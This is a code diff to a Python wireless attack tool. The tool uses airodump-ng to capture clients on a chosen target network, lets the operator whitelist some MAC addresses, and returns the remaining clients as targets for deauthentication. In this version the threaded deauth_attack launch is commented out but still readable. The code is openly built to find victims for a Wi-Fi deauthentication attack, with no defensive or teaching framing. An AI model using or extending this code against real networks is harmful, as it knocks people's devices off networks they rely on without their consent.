@@ -166,6 +166,36 @@ def parse_wifi_networks():
 def get_clients(wifi_ssid, wifi_channel, inter):
     """Capture clients on target network."""
     subprocess.Popen(["airodump-ng", "--bssid", wifi_ssid, "--channel", wifi_channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", inter],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    active_clients = set()
+    clients_to_deauth = list()
+    try:
+        while True:
+                os.system("clear")
+                for file_name in os.listdir():
+                    fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
+                    if ".csv" in file_name and file_name.startswith("clients"):
+                        with open(file_name) as csv_h:
+                            csv_h.seek(0)
+                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                            for index, row in enumerate(csv_reader):
+                                if index < 3:
+                                    pass
+                                else:
+                                    active_clients.add(row["Station MAC"])
+                print(f"{yellow}[*]{reset} Scanning clients. Press Ctrl+C when you want to select clients to exclude from attack.\n")
+                print(f"{light_green}Station MAC           |{reset}")
+                print(f"{light_green}______________________|{reset}")
+                for item in active_clients:
+                    print(f"{item}")
+                time.sleep(1)
+    except KeyboardInterrupt:
+        excluded_clients = filter_clients()
+    for client in active_clients:
+        if client in excluded_clients:
+            pass
+        else:
+            clients_to_deauth.append(client)
+    return clients_to_deauth
 
 def filter_clients():
     """Exclude whitelisted MACs from attack."""
@@ -226,40 +256,19 @@ def main():
     wifi_network_choice = parse_wifi_networks()
     hackbssid = wifi_network_choice["BSSID"]
     hackchannel = wifi_network_choice["channel"].strip()
-    get_clients(hackbssid, hackchannel, inter)
-    active_clients = set()
-    threads_started = []
-    excluded_clients = filter_clients()
+    clients_to_deauth = get_clients(hackbssid, hackchannel, inter)
     
-    subprocess.run(["airmon-ng", "start", inter, hackchannel])
-    try:
-        while True:
-            os.system("clear")
-            for file_name in os.listdir():
-                fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
-                if ".csv" in file_name and file_name.startswith("clients"):
-                    with open(file_name) as csv_h:
-                        print(f"{green}[+] Running...{reset}")
-                        csv_h.seek(0)
-                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
-                        for index, row in enumerate(csv_reader):
-                            if index < 5:
-                                pass
-                            elif row["Station MAC"] in excluded_clients:
-                                pass
-                            else:
-                                active_clients.add(row["Station MAC"])
+    # threads_started = []
 
-                print("Station MAC           |")
-                print("______________________|")
-                for item in active_clients:
-                    print(f"{item}")
-                    if item not in threads_started:
-                        threads_started.append(item)
-                        t = threading.Thread(target=deauth_attack, args=[hackbssid, item, inter], daemon=True)
-                        t.start()
-    except KeyboardInterrupt:
-        print("\nStopping Deauth")
+    # subprocess.run(["airmon-ng", "start", inter, hackchannel])
+    # try:
+       
+    #                 if item not in threads_started:
+    #                     threads_started.append(item)
+    #                     t = threading.Thread(target=deauth_attack, args=[hackbssid, item, inter], daemon=True)
+    #                     t.start()
+    # except KeyboardInterrupt:
+    #     print("\nStopping Deauth")
 
     restore_managed_mode(inter)
 
